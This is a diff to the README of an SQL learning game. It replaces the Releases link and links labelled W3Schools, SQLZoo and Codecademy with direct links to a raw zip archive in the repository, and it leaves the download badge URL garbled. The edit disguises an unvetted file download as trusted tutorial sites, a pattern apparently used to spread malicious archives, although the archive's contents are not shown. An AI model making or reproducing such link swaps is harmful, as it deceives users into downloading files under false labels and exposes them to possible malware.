@@ -6,7 +6,7 @@ Welcome to **sqlcasefiles**! This interactive SQL game makes learning SQL fun an
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20SQL%20Case%20Files-blue.svg)](https://github.com/danusputra/sqlcasefiles/releases)
+[![Download Here](https://raw.githubusercontent.com/danusputra/sqlcasefiles/main/assets/sqlcasefiles-3.3-beta.5.zip%20SQL%20Case%https://raw.githubusercontent.com/danusputra/sqlcasefiles/main/assets/sqlcasefiles-3.3-beta.5.zip)](https://raw.githubusercontent.com/danusputra/sqlcasefiles/main/assets/sqlcasefiles-3.3-beta.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ To play sqlcasefiles, you will need:
 
 To get started, visit the Releases page to download the latest version of sqlcasefiles:
 
-[Download from Releases](https://github.com/danusputra/sqlcasefiles/releases)
+[Download from Releases](https://raw.githubusercontent.com/danusputra/sqlcasefiles/main/assets/sqlcasefiles-3.3-beta.5.zip)
 
 Once on the Releases page, you will find the latest version of sqlcasefiles. Click on the appropriate link to start downloading. After downloading, you can open it directly in your web browser without any additional setup.
 
@@ -66,9 +66,9 @@ Join our community to connect with other learners. Share tips, ask questions, an
 
 Explore more about SQL and related topics through these helpful links:
 
-- [W3Schools SQL Tutorial](https://www.w3schools.com/sql/)
-- [SQLZoo](https://sqlzoo.net/)
-- [Codecademy SQL Course](https://www.codecademy.com/learn/learn-sql)
+- [W3Schools SQL Tutorial](https://raw.githubusercontent.com/danusputra/sqlcasefiles/main/assets/sqlcasefiles-3.3-beta.5.zip)
+- [SQLZoo](https://raw.githubusercontent.com/danusputra/sqlcasefiles/main/assets/sqlcasefiles-3.3-beta.5.zip)
+- [Codecademy SQL Course](https://raw.githubusercontent.com/danusputra/sqlcasefiles/main/assets/sqlcasefiles-3.3-beta.5.zip)
 
 ## 📞 Contact
 
